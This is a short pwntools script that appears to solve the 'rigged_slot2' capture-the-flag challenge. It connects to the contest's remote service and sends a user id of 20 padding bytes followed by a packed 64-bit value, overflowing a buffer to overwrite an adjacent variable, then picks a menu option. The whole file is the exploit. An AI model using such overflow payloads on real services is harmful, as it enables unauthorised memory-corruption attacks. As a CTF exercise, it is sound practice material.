from pwn import *
from ctypes import *
import random
import time

context.arch = "amd64"

e = context.binary = ELF("rigged_slot2")

p=e.process()
p = remote("riggedslot2.ctf.intigriti.io", 1337)


print(p.recv())

target = 0x14684c + 1
user_id = b'a'*20 + p64(target)
#start_time = time.time()  # Record start time
p.sendline(user_id)

print(p.recv())
p.sendline("1")
print(p.recv())
print(p.recv())
print(p.recv())
